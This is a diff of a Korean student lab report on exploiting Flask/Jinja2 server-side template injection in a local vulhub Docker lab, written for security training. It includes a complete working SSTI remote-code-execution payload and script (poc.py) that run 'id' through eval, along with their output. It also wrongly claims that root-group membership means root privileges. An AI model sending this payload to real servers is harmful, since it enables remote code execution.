@@ -1,37 +1,106 @@
-# Flask (Jinja2) SSTI (Server Side Template Injection)
+# Flask (Jinja2) SSTI 취약점 검증 및 PoC 실습 보고서
+> 화이트햇 스쿨 3기 - 최아현(5975)
 
-> 화이트햇 스쿨 1기 - [신경방 (@positiveWand)](https://github.com/positiveWand)
-
-<br/>
-
-## 요약
-
-- 서버 탬플릿 엔진은 사용자로부터 요청이 들어올때마다 작성된 템플릿 파일을 렌더링하고 그 결과를 사용자에게 반환한다.
-- 서버는 서버에 저장된 데이터, 사용자 요청과 함께 전달받은 데이터 등과 같이 서버에서 사용가능한 데이터들을 이용해 렌더링을 수행한다.
-- 이 취약점은 Flask와 Flask에서 사용하는 템플릿 엔진 "Jinja2"를 사용할 때 발생. 사용자가 잘 구성한 렌더링 코드 문자열을 서버에 전달하고 서버가 이 문자열을 그대로 템플릿 엔진에 삽입하여 렌더링을 수행한다면 사용자가 전달한 임의의 Python 코드가 실행될 수 있다.
+> 생성한 Pull Request 링크 : https://github.com/gunh0/kr-vulhub/pull/272
 
 <br/>
 
-## 환경 구성 및 실행
+## 1. SSTI 개념 증명 해보기 (poc코드 수정 전)
 
-1. `docker compose up -d` 를 실행하여 테스트 환경을 실행.
-2. `http://your-ip:8000/?name={{233*233}}`에 접속하여 54289가 출력되는지 확인하여 SSTI 취약점이 존재함을 확인합니다.
-3. `python poc.py`를 실행하여 공격을 수행하는 URL을 확인.
-4. 해당 URL에 접속하면 삽입한 코드가 실행되어 서버 프로세스의 id가 출력되는 것을 확인할 수 있음.
+과제에서 제공받은 깃허브 링크에서 **Flask (Jinja2) SSTI (Server Side Template Injection) 취약점**을 선택하였고, 이 취약점을 실습해보기 위하여 해당 깃허브 링크를 fork하여 내 github에 복사하였다.
 
-+) `poc.py`의 `script` 변수의 값을 원하는 Python 코드로 바꾸면 해당 코드가 서버에서 실행된다.
-(기본 코드는 서버 프로세스의 id를 출력하는 코드)
+### 1.1 실습 환경 구축
 
+- docker desktop 설치
+- Git-2.49.0-64-bit 설치
+- python 3.13.3 도 설치
+  
+### 1.2 프로젝트 clone 및 실행
+
+다음 명령어를 통하여 내 GitHub에서 Fork된 kr-vulhub 클론한 뒤 해당 폴더로 이동하였다.
 <br/>
+1. git clone https://github.com/ChoiAh/kr-vulhub.git
+2. cd kr-vulhub/Flask/SSTI
 
-## 결과
-
-![poc 실행 이미지](./1.png)
-
-![서버로부터 받은 반환값](./2.png)
-
+### 1.3 Docker로 Flask 서버 실행하기
+<docker-compose up -d>명령어를 통하여 Flask 서버를 실행하였다.
+![docker-compose up -d 실행결과](./1.png)
 <br/>
+### 1.4 브라우저에서 flask 서버 접속
+브라우저에서 서버를 접속하여 결과를 확인해보았다.
+![서버 접속 실행결과](./2.png)
+1. http://localhost:8000/?name={{7*7}} → Hello 49 출력 확인
+2. http://localhost:8000/?name={{5*5}} → Hello 25 출력 확인
 
-## 정리
+### 1.5 출력 결과 분석
+이건 서버가 내가 입력한 값(ex. {7*7} / {5*5})을 받아서 내부에서 Flask 서버가 이걸 Jinja2 템플릿 문법으로 처리해서 입력된 수식을 실제로 계산한 결과를 출력하여 보여주는 것을 확인하였다. 이는 서버가 사용자의 입력을 문자열로 인식하여 처리하는 것이 아닌 python연산처럼 처리하고 실행한 것을 의미한다. 
+<br/>
+이는 서버의 템플릿 엔진이 외부의 사용자 입력을 검증하지 않고 실행하여 발생한 것으로 위의 Flask 서버에는 SSTI 취약점이 존재한다. 이러한 단순 수식 계산에서 더 나아가 시스템 명령어를 실행할 수 있는지를 확인해보기 위하여 이어지는 부분에서 공격 코드를 작성하여 실습을 진행해보고자 한다.
 
-- 이 취약점은 사용자가 서버에서 임의의 코드를 실행하도록 할 수 있게 만들기 때문에 위험하다. 안전한 웹 서비스 운영을 위해서는 서버 개발자가 혹은 라이브러리, 프레임워크에서 사용자가 전달한 데이터가 템플릿 코드인지 확인하여 필터링하거나 사용자 입력 데이터가 실행으로 이어지지 않도록 해야한다.
+## 2. 공격코드 (poc.py) 실행
+Flask 서버에 실제 시스템 명령어 삽입하기 (PoC 수행)
+
+### 2.1 poc.py 작성
+vs code에서 C:\Users\chloe\kr-vulhub\Flask\SSTI 이 경로에 poc.py라는 이름의 py파일을 생성하고 아래의 코드를 입력해 넣었다.
+```python
+from urllib import parse
+import requests
+
+script = '__import__("os").popen("id").read()'
+# SSTI 취약점 유발 코드
+value = """{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('%s') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}"""
+value = value.replace("%s", script)
+
+print("<SSTI 취약점 유발 코드>")
+print(value)
+print()
+
+# SSTI를 수행하는 URL 생성
+query = [("name", value)]
+url = "http://localhost:8000/?" + parse.urlencode(query)
+print("<요청 URL>")
+print(url)
+print()
+
+# 실제 요청 전송
+response = requests.get(url)
+print("<서버의 응답>")
+print(response.text)
+```
+
+![vs code로 poc.py작성](./3.png)
+
+### 2.2 poc.py 실행
+<py poc.py> 명령을 통하여 위에서 작성한 코드를 실행해보았다.
+![poc.py 실행결과](./4.png)
+위의 사진처럼 출력이 되었다.
+ > uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root)
+
+### 2.3 출력값의 의미
+- uid=33(www-data)  → 현재 FLASK서버가  uid=33(www-data) 계정으로 실행중이라는 의미
+- gid=33(www-data) →   현재 FLASK서버가  gid=33(www-data) 그룹 계정으로 실행중이라는 의미
+- groups=33(www-data),0(root) → 	www-data 그룹 외에도 root 그룹(0)에도 속해 있음 (→ root 권한 보유)
+
+
+### 2.4 출력 결과 분석
+위의 실습 실행 결과를 통하여 템플릿 인젝션을 통하여 서버에서 임의의 시스템 명령어가 실행이 가능함을 확인하였다.
+공격자는 id 명령어를 통해 서버 내부의 사용자 계정 정보를 조회할 수 있었으며, 해당 Flask 서버가 uid=33(www-data) 계정으로 실행되고 있음을 확인하였다. 또한, gid=33(www-data) 그룹 소속일 뿐만 아니라, groups=33(www-data),0(root) 결과를 통해 서버가 root 그룹(0) 에도 속해 있어 root 권한을 포함하고 있음을 알 수 있었다.
+
+이처럼 SSTI(Server Side Template Injection) 취약점은 정보유출을 넘어 서버의 권한 탈취 등의 심각한 보안 위협으로 이어질 수 있다. 따라서 Flask와 같은 서버 운영 시에는 템플릿 인젝션 취약점 여부를 반드시 점검하고, 사용자 입력값에 대한 철저한 검증을 수행함으로써 SSTI 취약점이 발생하지 않도록 해야한다.
+
+
+## 3. 결론
+poc.py 스크립트를 통하여 SSTI(Server Side Template Injection) 취약점이 존재하는 FLASK 서버에 악의적인 템플릿 코드<`__import__("os").popen("id").read()` 명령어를 실행하는 코드>를 삽입하였다.
+따라서 서버는 해당 코드를 실행하여 현재 사용자의 UID, GID, groups 정보를 알려주었다. 
+이 실습을 통하여 flask 서버의 SSTI 취약점을 통하여 원격 코드 실행(RCE, Remote Code Execution)수준의 제어가 가능함을 확인할 수 있었으며 공격자는 name 파라미터에 Jinja2 템플릿 문법을 삽입함으로써 서버 측에서 Python 코드가 실행되도록 유도할 수 있었다. 즉, 단순 수식 평가 뿐만 아니라 시스템 명령어인 id 같은 명령어까지 실행할 수 있어 서버의 중요 정보인 UID, GID 정보가 노출되는 SSTI 취약점을 확인해 보았다.
+이러한 취약점의 경우**원격 명령 실행(RCE)** 으로 이어질 수 있기에 심각한 보안 위협이며, 이에 대한 조치가 필요함을 느꼈다.
